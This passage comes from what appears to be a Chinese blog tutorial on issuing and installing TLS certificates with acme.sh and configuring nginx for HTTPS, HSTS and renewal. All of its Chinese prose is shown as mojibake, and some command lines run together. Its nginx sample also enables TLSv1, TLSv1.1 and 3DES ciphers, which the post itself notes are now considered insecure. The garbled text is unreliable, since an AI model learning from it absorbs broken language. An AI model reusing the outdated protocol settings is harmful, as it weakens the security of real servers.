å¤šåŸŸåé…ç½®</h3><p>å¤šä¸ªåŸŸåç­¾å‘åŒä¸€å¼ è¯ä¹¦ã€‚åªéœ€è¦åœ¨éªŒè¯æ–¹å¼ä¹‹åæ·»åŠ å¤šä¸ª <code>-d &lt;YourDomainHere&gt;</code> å‚æ•°å°±è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --issue -d example.com -w /home/wwwroot/example.com -d www.example.comacme.sh  --issue  -d example.com  --standalone  -d www.example.com acme.sh  --issue  -d example.com  --dns  -d www.example.com</code></pre><p>ä¹Ÿå¯ä»¥å¤šä¸ªåŸŸåæŒ‡å®šä¸åŒçš„éªŒè¯æ–¹å¼ï¼Œä¾‹å¦‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  <span class="token punctuation">\</span>-d aa.com  -w /home/wwwroot/aa.com <span class="token punctuation">\</span>-d bb.com  --dns dns_cf <span class="token punctuation">\</span>-d cc.com  --apache <span class="token punctuation">\</span>-d dd.com  -w /home/wwwroot/dd.com</code></pre><br><h3 id="2-4-æ³›åŸŸåé…ç½®"><a href="#2-4-æ³›åŸŸåé…ç½®" class="headerlink" title="2.4 æ³›åŸŸåé…ç½®"></a>2.4 æ³›åŸŸåé…ç½®</h3><p>Wildcard certificates</p><p>åŒç†ï¼Œ<strong>åªéœ€è¦åŠ ä¸ª<code>*</code>**å°±å¥½ã€‚ä¸è¿‡å¥½åƒ</strong>åªé€‚ç”¨äº DNS éªŒè¯**çš„æ–¹å¼ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue -d example.com  -d <span class="token string">'*.example.com'</span>  --dns dns_cf</code></pre><br><h3 id="2-5-ç­¾å‘-ECC-è¯ä¹¦"><a href="#2-5-ç­¾å‘-ECC-è¯ä¹¦" class="headerlink" title="2.5 ç­¾å‘ ECC è¯ä¹¦"></a>2.5 ç­¾å‘ ECC è¯ä¹¦</h3><p>é»˜è®¤ç­¾å‘çš„éƒ½æ˜¯åŸºäº RSA å¯†é’¥åŠ å¯†çš„è¯ä¹¦ï¼Œè€Œ <strong>ECC</strong> (Elliptic Curve Cryptography, æ¤­åœ†æ›²çº¿å¯†ç ) å¯†é’¥çš„ä¿å¯†æ€§æ¯” RSA æ›´å¥½ï¼Œå¯†é’¥é•¿åº¦æ›´çŸ­ï¼Œæ›´èƒ½å¯¹æŠ—é‡å­è§£å¯†ç­‰ï¼Œç›®å‰ç°ä»£çš„æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨éƒ½æ”¯æŒ ECC è¯ä¹¦äº†ï¼ˆWindows XP åŠå…¶ä¹‹å‰çš„å°±ç®—äº†ï¼‰ã€‚</p><p><code>Let's Encrypt</code> æä¾›äº† ECDSA è¯ä¹¦çš„ç­¾å‘ï¼Œä¸” acme.sh ä¹Ÿæ”¯æŒã€‚</p><p>æˆ‘çœ‹ç½‘ä¸Šçš„æ•™ç¨‹åŸºæœ¬æ²¡è®² ECC è¯ä¹¦çš„ç­¾å‘ï¼Œè¿™é‡Œå°±æ¥æ•´ä¸€ä¸‹å‘—ï¼</p><p>å…¶å®åªéœ€è¦åŠ ä¸Šä¸€ä¸ªä»¥ <code>ec-</code> ä¸ºå‰ç¼€çš„ <code>--keylength</code> å‚æ•°ï¼ˆæˆ– <code>-k</code>ï¼‰å°±å¯ä»¥äº†ã€‚ç†è®ºä¸Šä¸Šé¢çš„å„ç§éªŒè¯æ–¹å¼éƒ½é€‚ç”¨ã€‚</p><p>æ¯”å¦‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --issue -w /home/wwwroot/example.com -d example.com --keylength ec-256  <span class="token comment"># å•åŸŸå</span>acme.sh --issue -w /home/wwwroot/example.com -d example.com -d www.example.com --keylength ec-256  <span class="token comment"># å¤šåŸŸå</span></code></pre><p>æ”¯æŒä»¥ä¸‹é•¿åº¦çš„è¯ä¹¦ï¼Œä¸€èˆ¬å°±ç”¨ <code>ec-256</code> å°±è¡Œäº†ã€‚</p><blockquote><ol><li><strong>ec-256 (prime256v1, â€œECDSA P-256â€)</strong></li><li><strong>ec-384 (secp384r1,  â€œECDSA P-384â€)</strong></li><li><strong>ec-521 (secp521r1,  â€œECDSA P-521â€, which is not supported by Letâ€™s Encrypt yet.)</strong></li></ol></blockquote><br><h2 id="0x03-å®‰è£…-copy-è¯ä¹¦"><a href="#0x03-å®‰è£…-copy-è¯ä¹¦" class="headerlink" title="0x03 å®‰è£…(copy)è¯ä¹¦"></a>0x03 å®‰è£…(copy)è¯ä¹¦</h2><p>ç­¾å‘è¯ä¹¦æˆåŠŸåï¼Œéœ€è¦æŠŠè¯ä¹¦å®‰è£…æˆ–è€…å¤åˆ¶åˆ°çœŸæ­£éœ€è¦çš„åœ°æ–¹ï¼Œå¦‚ nginx / apache çš„ç›®å½•ä¸‹ã€‚</p><p>å®˜æ–¹è¯´<strong>å¿…é¡»</strong>ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥å®‰è£…è¯ä¹¦ï¼Œ<strong>ä¸èƒ½</strong>ç›´æ¥ç”¨ <code>~/.acme.sh/</code>ç›®å½•ä¸‹çš„è¯ä¹¦æ–‡ä»¶ï¼Œå› ä¸ºé‚£åªèƒ½å†…éƒ¨ä½¿ç”¨ï¼Œä¸”æœªæ¥ç›®å½•ç»“æ„å¯èƒ½ä¼šæ›´æ”¹ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ <code>--installcert</code> å‘½ä»¤ï¼ŒæŒ‡å®šç›®æ ‡ä½ç½®ï¼Œç„¶åè¯ä¹¦æ–‡ä»¶å°±ä¼šè¢« copy åˆ°ç›¸åº”çš„ä½ç½®äº†ã€‚</p><p>å…¶ä¸­åŸŸåæ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–å‚æ•°æ˜¯å¯é€‰çš„ã€‚</p><p>æœ‰å¿…è¦çš„è¯ï¼Œå¯èƒ½éœ€è¦å¯¹è¯ä¹¦æ–‡ä»¶çš„æ‰€å±æƒé™è¿›è¡Œä¸€äº›è®¾ç½®ã€‚ï¼ˆæˆ‘è¿™è¾¹æ²¡æœ‰é—®é¢˜å‘¢ï¼Œå°±ç•¥äº†å§ï¼‰</p><h3 id="3-1-Nginx"><a href="#3-1-Nginx" class="headerlink" title="3.1 Nginx"></a>3.1 Nginx</h3><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --installcert -d example.com <span class="token punctuation">\</span>--key-file       /path/to/keyfile/in/nginx/key.pem  <span class="token punctuation">\</span>--fullchain-file /path/to/fullchain/nginx/cert.pem <span class="token punctuation">\</span>--reloadcmd     <span class="token string">"service nginx force-reload"</span></code></pre><p>æ¯”å¦‚ä½ å¯ä»¥åœ¨ nginx çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª <code>ssl</code> ç›®å½•ï¼Œç„¶åæŠŠè¯ä¹¦å®‰è£… / copy è¿‡å»ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --installcert -d example.com <span class="token punctuation">\</span>        --key-file   /etc/nginx/ssl/example.com.key <span class="token punctuation">\</span>        --fullchain-file /etc/nginx/ssl/example.com.fullchain.cer <span class="token punctuation">\</span>        --reloadcmd  <span class="token string">"service nginx force-reload"</span></code></pre><blockquote><p>è¿™é‡Œç”¨çš„æ˜¯ <code>service nginx force-reload</code>, ä¸æ˜¯ <code>service nginx reload</code>, æ®æµ‹è¯•, <code>reload</code> å¹¶ä¸ä¼šé‡æ–°åŠ è½½è¯ä¹¦, æ‰€ä»¥ç”¨çš„ <code>force-reload</code>ã€‚</p><p>Nginx çš„é…ç½® <code>ssl_certificate</code> ä½¿ç”¨ <code>/etc/nginx/ssl/fullchain.cer</code> ï¼Œè€Œé <code>/etc/nginx/ssl/.cer</code> ï¼Œå¦åˆ™ <a href="https://www.ssllabs.com/ssltest/">SSL Labs</a> çš„æµ‹è¯•ä¼šæŠ¥ <code>Chain issues Incomplete</code> é”™è¯¯ã€‚</p></blockquote><h3 id="3-2-Apache"><a href="#3-2-Apache" class="headerlink" title="3.2 Apache"></a>3.2 Apache</h3><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --install-cert -d example.com <span class="token punctuation">\</span>--cert-file      /path/to/certfile/in/apache/cert.pem  <span class="token punctuation">\</span>--key-file       /path/to/keyfile/in/apache/key.pem  <span class="token punctuation">\</span>--fullchain-file /path/to/fullchain/certfile/apache/fullchain.pem <span class="token punctuation">\</span>--reloadcmd     <span class="token string">"service apache2 force-reload"</span></code></pre><p>åœ¨å‘½ä»¤ä¸­çš„ <strong><code>reloadcmd</code> å‚æ•°å¾ˆé‡è¦ï¼</strong> è¿™ä¸ªç”¨æ¥æŒ‡å®šè¯ä¹¦æ›´æ–°ï¼ˆRenewï¼‰åæ‰§è¡Œçš„å‘½ä»¤ï¼Œä»è€Œä½¿ç»­æœŸåçš„è¯ä¹¦ç”Ÿæ•ˆã€‚</p><p>é»˜è®¤ 60 å¤©å°±ä¼šç»­æœŸä¸€æ¬¡ï¼Œä¸Šé¢è¿™äº›å‚æ•°ä¼šè®°å½•ä¸‹æ¥å¹¶è‡ªåŠ¨æ‰§è¡Œã€‚ï¼ˆå‡ å¥½ï¼Œè´¼æ–¹ä¾¿</p><br><h2 id="0x04-ç”Ÿæˆ-dhparam-pem-æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰"><a href="#0x04-ç”Ÿæˆ-dhparam-pem-æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="0x04 ç”Ÿæˆ dhparam.pem æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰"></a>0x04 ç”Ÿæˆ dhparam.pem æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰</h2><pre class="language-bash" data-language="bash"><code class="language-bash">openssl dhparam -out /etc/nginx/ssl/dhparam.pem <span class="token number">2048</span></code></pre><p>è¿™ä¸€æ­¥æ˜¯ä¸ºäº†å¢å¼º SSL çš„å®‰å…¨æ€§ã€‚è¿™é‡Œç”Ÿæˆä¸€ä¸ªæ›´å¼ºå£®çš„ DHE å‚æ•°ã€‚</p><blockquote><p><strong>å‰å‘å®‰å…¨æ€§ï¼ˆForward Secrecyï¼‰</strong>çš„æ¦‚å¿µå¾ˆç®€å•ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åå•†ä¸€ä¸ªæ°¸ä¸é‡ç”¨çš„å¯†é’¥ï¼Œå¹¶åœ¨ä¼šè¯ç»“æŸæ—¶é”€æ¯å®ƒã€‚æœåŠ¡å™¨ä¸Šçš„ RSA ç§é’¥ç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ Diffie-Hellman å¯†é’¥äº¤æ¢ç­¾åã€‚ä» Diffie-Hellman  æ¡æ‰‹ä¸­è·å–çš„é¢„ä¸»å¯†é’¥ä¼šç”¨äºä¹‹åçš„ç¼–ç ã€‚å› ä¸ºé¢„ä¸»å¯†é’¥æ˜¯ç‰¹å®šäºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹çš„æŸä¸ªè¿æ¥ï¼Œå¹¶ä¸”åªç”¨åœ¨ä¸€ä¸ªé™å®šçš„æ—¶é—´å†…ï¼Œæ‰€ä»¥ç§°ä½œçŸ­æš‚æ¨¡å¼ï¼ˆEphemeralï¼‰ã€‚</p><p>ä½¿ç”¨äº†å‰å‘å®‰å…¨æ€§ï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…å–å¾—äº†ä¸€ä¸ªæœåŠ¡å™¨çš„ç§é’¥ï¼Œä»–æ˜¯ä¸èƒ½è§£ç ä¹‹å‰çš„é€šè®¯ä¿¡æ¯çš„ã€‚è¿™ä¸ªç§é’¥ä»…ç”¨äº Diffie Hellman  æ¡æ‰‹ç­¾åï¼Œå¹¶ä¸ä¼šæ³„éœ²é¢„ä¸»å¯†é’¥ã€‚Diffie Hellman ç®—æ³•ä¼šç¡®ä¿é¢„ä¸»å¯†é’¥ç»ä¸ä¼šç¦»å¼€å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ï¼Œè€Œä¸”ä¸èƒ½è¢«ä¸­é—´äººæ”»å‡»æ‰€æ‹¦æˆªã€‚</p><p>nginx ä¾èµ–äº OpenSSL ç»™ Diffie-Hellman ï¼ˆDHï¼‰çš„è¾“å…¥å‚æ•°ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™æ„å‘³ç€  Diffie-Hellman Ephemeralï¼ˆDHEï¼‰å°†ä½¿ç”¨ OpenSSL  çš„é»˜è®¤è®¾ç½®ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç”¨äºå¯†é’¥äº¤æ¢çš„1024ä½å¯†é’¥ã€‚å› ä¸ºæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨2048ä½è¯ä¹¦ï¼ŒDHE å®¢æˆ·ç«¯å°±ä¼šä½¿ç”¨ä¸€ä¸ªè¦æ¯”é DHE  å®¢æˆ·ç«¯æ›´å¼±çš„å¯†é’¥äº¤æ¢ã€‚</p></blockquote><p>æ›´å¤šå‚è€ƒ<a href="https://weakdh.org/sysadmin.html">è¿™é‡Œ Guide to Deploying Diffie-Hellman for TLS</a> å§ã€‚</p><br><h2 id="0x05-é…ç½®-Nginx"><a href="#0x05-é…ç½®-Nginx" class="headerlink" title="0x05 é…ç½® Nginx"></a>0x05 é…ç½® Nginx</h2><p>æ²¡ç”¨è¿‡ Apacheï¼Œè¿™é‡Œåªè¯´ Nginx å¥½äº†ã€‚<small>ï¼ˆå…¶å®ä¹Ÿä¸æ€ä¹ˆä¼šç”¨ï¼ˆå°å£°bb </small></p><p>ä¿®æ”¹ç½‘ç«™çš„ conf é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ SSL çš„ç›¸å…³é…ç½®ã€‚</p><pre class="language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">server_name</span> example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">listen</span>       <span class="token number">443</span> <span class="token keyword">ssl</span> http2 default_server<span class="token punctuation">;</span>    <span class="token keyword">listen</span>       <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">443</span> <span class="token keyword">ssl</span> http2 default_server<span class="token punctuation">;</span>    <span class="token comment"># ...    </span>    <span class="token comment"># ssl ç›¸å…³é…ç½®</span>    <span class="token keyword">ssl_certificate</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">ssl</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token punctuation">.</span>fullchain<span class="token punctuation">.</span>cer<span class="token punctuation">;</span>    <span class="token keyword">ssl_certificate_key</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">ssl</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token punctuation">.</span>key<span class="token punctuation">;</span>    <span class="token keyword">ssl_dhparam</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">ssl</span><span class="token operator">/</span>dhparam<span class="token punctuation">.</span>pem<span class="token punctuation">;</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token punctuation">.</span><span class="token number">1</span> TLSv1<span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">ssl_ciphers</span> <span class="token string">'[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES'</span><span class="token punctuation">;</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment"># ...</span><span class="token punctuation">}</span></code></pre><p><code>ssl_dhparam /etc/nginx/ssl/dhparam.pem;</code> æ˜¯åœ¨ 0x04 æ­¥éª¤ä¸­ç”Ÿæˆçš„ï¼Œå¯é€‰ã€‚</p><p><code>ssl_ciphers </code>ç”¨äºæŒ‡å®šåŠ å¯†å¥—ä»¶ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯ <a href="https://github.com/cloudflare/sslconfig/blob/master/conf">CloudFlare å®¶çš„</a>ï¼Œå…·ä½“ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥š emmmã€‚å¯ä»¥å‚è€ƒä¸€ä¸‹ Mozilla çš„ Wikiï¼š<a href="https://wiki.mozilla.org/Security/Server_Side_TLS">Security/Server Side TLS</a></p><p>æ›´å¤šå‚æ•°å¯ä»¥å‚è€ƒ nginx çš„æ–‡æ¡£ï¼š<a href="http://nginx.org/en/docs/http/ngx_http_ssl_module.html">Module ngx_http_ssl_module</a></p><h3 id="TLSv1-3ï¼ˆå¯é€‰ï¼‰"><a href="#TLSv1-3ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="TLSv1.3ï¼ˆå¯é€‰ï¼‰"></a>TLSv1.3ï¼ˆå¯é€‰ï¼‰</h3><p>ç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½ä¸Š <strong>TLSv1.3</strong> äº†ï¼Œè¯ä¹¦æ£€æµ‹çš„ç½‘ç«™å¯¹äº TLSv1ã€TLSv1.1 éƒ½è®¤ä¸ºä¸å®‰å…¨äº†ï¼ŒFirefox è‡ª 74.0 ç‰ˆæœ¬å¼€å§‹ä¹Ÿå®Œå…¨æ”¾å¼ƒå¯¹åŠ å¯†åè®® <em>TLS 1.0</em> å’Œ <em>TLS 1.1</em> çš„æ”¯æŒäº†ã€‚</p><p>å¯¹äº TLSv1.3 çš„é…ç½®ï¼Œéœ€è¦å®‰è£…æœ€æ–°ç‰ˆçš„ opensslï¼ˆOpenSSL 1.1.1 built with TLSv1.3æˆ–æ›´é«˜ï¼‰ï¼Œè€Œåé‡æ–°ç¼–è¯‘ nginxï¼Œæ˜¯æœ‰ç‚¹éº»çƒ¦è¿™é‡Œæ‡’å¾—å¼„äº†ï¼Œåé¢éœ€è¦å†æŠ˜è…¾å§ã€‚</p><h3 id="å¼€å¯-HSTSï¼ˆå¯é€‰ï¼‰"><a href="#å¼€å¯-HSTSï¼ˆå¯é€‰ï¼‰" class="headerlink" title="å¼€å¯ HSTSï¼ˆå¯é€‰ï¼‰"></a>å¼€å¯ HSTSï¼ˆå¯é€‰ï¼‰</h3><p>å½“ç„¶ï¼Œä¸ºäº†æ›´åŠ å®‰å…¨ï¼Œ<strong>å¯ä»¥é€‰æ‹©å¼€å¯ HSTS</strong>ï¼ˆHTTP Strict Transport Securityï¼ŒHTTPä¸¥æ ¼ä¼ è¾“å®‰å…¨åè®®ï¼‰ï¼Œå¼ºåˆ¶æµè§ˆå™¨é€šè¿‡ https è¿›è¡Œè®¿é—®ã€‚éœ€è¦åœ¨ location ä¸‹çš„è®¾ç½®ä¸­åŠ å…¥ä¸€ä¸ª headerã€‚</p><pre class="language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">add_header</span> Strict<span class="token operator">-</span>Transport<span class="token operator">-</span>Security <span class="token string">"max-age=31536000; includeSubDomains; preload"</span><span class="token punctuation">;</span></code></pre><p>æ¥ä¸‹æ¥çš„ä¸€å¹´ï¼ˆå³31536000ç§’ï¼‰ä¸­ï¼Œæµè§ˆå™¨çœ‹åˆ° header ä¸­åŒ…å« <code> Strict-Transport-Security</code> çš„è¯å°±ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ° httpsã€‚</p><p>ä½†æ˜¯åœ¨é¦–æ¬¡è®¿é—®ç½‘ç«™æ—¶å¦‚æœè¢«åŠ«æŒäº†ï¼Œæµè§ˆå™¨è¿˜æ˜¯å¯èƒ½ä¼šé€šè¿‡ HTTP æ˜æ–‡ä¼ é€’ä¿¡æ¯ã€‚ä¸ºæ­¤ï¼ŒChrome ç»´æŠ¤äº†ä¸€ä¸ª HSTS preload listï¼Œå†…ç½®åœ¨æµè§ˆå™¨ä¸­ï¼Œå¯¹äº Chrome, Firefox, Opera, Safari, IE 11 and Edge ç­‰ä¸»æµæµè§ˆå™¨ä¹Ÿé€‚ç”¨ã€‚å¯ä»¥<a href="https://hstspreload.org/">åœ¨è¿™é‡Œ</a>æäº¤ä½ çš„åŸŸååˆ°è¿™ä¸ªåˆ—è¡¨é‡Œã€‚ï¼ˆä¸è¿‡æäº¤ä¹‹å‰è¦è€ƒè™‘å¥½ï¼Œå…¨ç«™ä¸Š https å™¢</p><p>å¦‚æœ TLS è¯ä¹¦æ— æ•ˆæˆ–ä¸å¯ä¿¡ï¼Œç”¨æˆ·ä¸èƒ½å¿½ç•¥æµè§ˆå™¨è­¦å‘Šç»§ç»­è®¿é—®ç½‘ç«™ã€‚è¿™å°±æ˜¯å‰å‡ å¤©è®¿é—® GitHub (Pages) ç­‰ç½‘ç«™è¢«æ‹¦ä¸‹æ¥çš„åŸå› äº†ã€‚</p><hr><p>ä¸Šé¢çš„é…ç½®å®Œæˆåæ£€æŸ¥ä¸€ä¸‹é…ç½®æ˜¯å¦æ­£ç¡®ï¼Œè€Œåé‡å¯ nginxã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">nginx -tsystemctl restart nginx</code></pre><p>ä¹‹åå°±å¯ä»¥è¯•ä¸€ä¸‹èƒ½ä¸èƒ½é€šè¿‡ https æ¥è®¿é—®è‡ªå·±çš„ç½‘ç«™å•¦ï¼</p><p><strong>åˆ°è¿™é‡Œ SSL é…ç½®å°±å‘Šä¸€æ®µè½äº†ï¼Œä¸‹é¢æ˜¯ä¸€äº› acme.sh çš„ç»´æŠ¤ç›¸å…³çš„äº†ã€‚</strong></p><br><h2 id="0x06-æ›´æ–°è¯ä¹¦"><a href="#0x06-æ›´æ–°è¯ä¹¦" class="headerlink" title="0x06 æ›´æ–°è¯ä¹¦"></a>0x06 æ›´æ–°è¯ä¹¦</h2><p>è¯ä¹¦çš„æœ‰æ•ˆæœŸä¸º 90 å¤©ï¼Œacme.sh ä¼š 60 å¤©æ›´æ–°ï¼ˆRenewï¼‰ä¸€æ¬¡ã€‚</p><p>åœ¨å®‰è£… acme.sh çš„æ—¶å€™å°±è‡ªåŠ¨é…ç½®äº†ä¸€æ¡ cron ä»»åŠ¡äº†ï¼Œä¼šæ¯å¤©æ£€æŸ¥è¯ä¹¦çš„æƒ…å†µã€‚å½“ç„¶å¯ä»¥åˆ° crontab é‡Œçœ‹ä¸€ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># crontab -l</span><span class="token number">43</span> <span class="token number">0</span> * * * <span class="token string">"/root/.acme.sh"</span>/acme.sh --cron --home <span class="token string">"/root/.acme.sh"</span> <span class="token operator">&gt;</span> /dev/null</code></pre><p>ä¹Ÿå¯ä»¥è¯•ç€ç”¨ä¸Šé¢è¿™æ¡å‘½ä»¤æ‰§è¡Œçœ‹ä¸€ä¸‹ç›¸å…³çš„é…ç½®æ˜¯å¦æ­£ç¡®ã€‚</p><p>å¼ºåˆ¶æ›´æ–°å¯ä»¥è¿™æ ·ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --renew -d example.com --force  acme.sh --renew -d example.com --force --ecc  <span class="token comment"># å¦‚æœç”¨çš„æ˜¯ECCè¯ä¹¦</span></code></pre><br><h2 id="0x07-åœæ­¢æ›´æ–°è¯ä¹¦"><a href="#0x07-åœæ­¢æ›´æ–°è¯ä¹¦" class="headerlink" title="0x07 åœæ­¢æ›´æ–°è¯ä¹¦"></a>0x07 åœæ­¢æ›´æ–°è¯ä¹¦</h2><p>æŸ¥çœ‹è¯ä¹¦åˆ—è¡¨</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --list</code></pre><p>åœæ­¢ Renew</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --remove -d example.com <span class="token punctuation">[</span>--ecc<span class="token punctuation">]</span></code></pre><p>ä¹‹åæ‰‹åŠ¨æŠŠç›®å½•ä¸‹çš„è¯ä¹¦ç§»é™¤å°±è¡Œã€‚</p><br><h2 id="0x08-å‡çº§-acme-sh"><a href="#0x08-å‡çº§-acme-sh" class="headerlink" title="0x08 å‡çº§ acme.sh"></a>0x08 å‡çº§ acme.sh</h2><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --upgrade    <span class="token comment"># æ‰‹åŠ¨å‡çº§</span>acme.sh --upgrade --auto-upgrade    <span class="token comment"># è‡ªåŠ¨å‡çº§</span>acme.sh --upgrade --auto-upgrade <span class="token number">0</span>  <span class="token comment"># åœæ­¢è‡ªåŠ¨å‡çº§</span></code></pre><br><h2 id="0xFF-å°ç»“"><a href="#0xFF-å°ç»“" class="headerlink" title="0xFF å°ç»“"></a>0xFF å°ç»“</h2><p>é™¤äº†ä¸Šé¢è¿™äº›é…ç½®ä¹‹å¤–ï¼Œacme.sh è¿˜æä¾›äº†é€šçŸ¥æé†’ï¼Œå¯ä»¥è°ƒç”¨å…¶ä»– API æ¥æ¨é€æé†’ï¼Œå…·ä½“å‚è€ƒå®˜æ–¹Wikiï¼š<a href="https://github.com/acmesh-official/acme.sh/wiki/notify">notify</a>ã€‚</p><p>æ€»ä¹‹æ„Ÿè§‰<strong>è¿™ä¸ªå·¥å…·è¿˜æ˜¯å¾ˆå®ç”¨çš„ï¼Œå¤§å¤§é™ä½äº† SSL é…ç½®çš„é—¨æ§›</strong>å‘¢ã€‚</p><p>è‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œæ„Ÿè§‰æˆ‘æŠŠå®˜æ–¹çš„æ•™ç¨‹ç¿»è¯‘äº†ï¼Œç„¶ååˆæ‰¾äº†ä¸€äº›å…¶ä»–çš„èµ„æ–™æ•´åˆèµ·æ¥äº†çš„äºšå­emmmã€‚ä¸è¿‡å¤§éƒ¨åˆ†è¿˜æ˜¯è‡ªå·±æ‰‹ç çš„å­—å•¦ï¼</p><p>å®é™…ä¸Šæˆ‘è¿™æ¬¡é…ç½®çš„æ˜¯ ECC å¯†é’¥çš„æ³›åŸŸåè¯ä¹¦ï¼Œç”¨çš„æ˜¯ DNS API çš„æ¨¡å¼ã€‚å…¶å®å‡ ä¸ªæœˆå‰å°±æŠ˜è…¾è¿‡ SSL è¯ä¹¦çš„é…ç½®äº†ï¼Œç„¶è€Œè¿‡äº†å°±å¿˜äº†ï¼Œå½“æ—¶å…ˆæ˜¯ç”¨ HTTP æ¨¡å¼è¿›è¡ŒéªŒè¯ï¼Œå‘ç°è¡Œä¸é€šæ‰æ¢çš„ DNS æ¨¡å¼ã€‚è¿™æ¬¡å¹²è„†ä¸€èµ·ç†ä¸€éå¥½äº†ï¼Œè¿‡ç¨‹ä¸­å‘ç°åŸæ¥ HTTP æ¨¡å¼éªŒè¯æ¯”æˆ‘æƒ³çš„è¿˜è¦å¼ºå¤§ï¼Œåªæ˜¯éœ€æ±‚ï¼ˆä¸»è¦æ˜¯éœ€è¦æ³›åŸŸåè¯ä¹¦ï¼‰å¯¹ä¸ä¸Šç½¢äº†ã€‚</p><p>æ€ä¹ˆè¯´å¥½å‘¢ï¼Œç»å¯¹å®‰å…¨ä¸å¤§å¯èƒ½ï¼Œéƒ½æ˜¯æƒ³æ–¹è®¾æ³•å°½å¯èƒ½ç›¸å¯¹å®‰å…¨ä¸€äº›å‘¢ã€‚</p><p>å¸Œæœ›è¿™ä¸€ç¯‡ä¸ä¼šæµªè´¹æ‚¨çš„å®è´µæ—¶é—´å‘¢ï¼Œæœ‰ç”¨çš„è¯æ¬¢è¿ç»™æˆ‘ä¹°ç‚¹å¥½åƒçš„/buy me a coffeeï¼ˆé¥¿äº†å–µ</p><p>æºœäº†æºœäº†ï¼ˆ</p><h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><p>ä¸‹é¢æœ‰çš„æ˜¯å®˜æ–¹æ–‡æ¡£ï¼Œæœ‰çš„æ˜¯åšå®¢ä¹‹ç±»çš„ï¼Œç”±äºæ—¶æ•ˆæ€§æœ‰äº›å†…å®¹å¯èƒ½ä¸é€‚ç”¨äº†ã€‚æ³¨æ„ä¸€ä¸‹å°±å¼ã€‚</p><ul><li><p><a href="https://github.com/acmesh-official/acme.sh">acme.sh GitHub ä»“åº“</a>  </p></li><li><p><a href="https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E">å®˜æ–¹ä¸­æ–‡è¯´æ˜</a>  </p></li><li><p><a href="https://github.com/acmesh-official/acme.sh/wiki/How-to-issue-a-cert">How to issue a certï¼ˆå®˜æ–¹Wikiï¼‰</a>  </p></li><li><p><a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi">How to use DNS API</a>  </p></li><li><p><a href="https://wiki.mozilla.org/Security/Server_Side_TLS">Security/Server Side TLS</a>  </p></li><li><p><a href="http://nginx.org/en/docs/http/ngx_http_ssl_module.html">ï¼ˆNginxæ–‡æ¡£ï¼‰Module ngx_http_ssl_module</a>  </p></li><li><p><a href="https://imququ.com/post/ecc-certificate.html">å¼€å§‹ä½¿ç”¨ECCè¯ä¹¦éƒ¨ç½²HTTPS</a>  </p></li><li><p><a href="https://www.cnblogs.com/xueweihan/p/10057656.html">MySSL HTTPS è¯„çº§ B å‡ A+</a>  </p></li><li><p><a href="https://www.acgist.com/article/541.html">Nginxå¼€å¯TLSv1.3å’ŒHTTP/2</a>  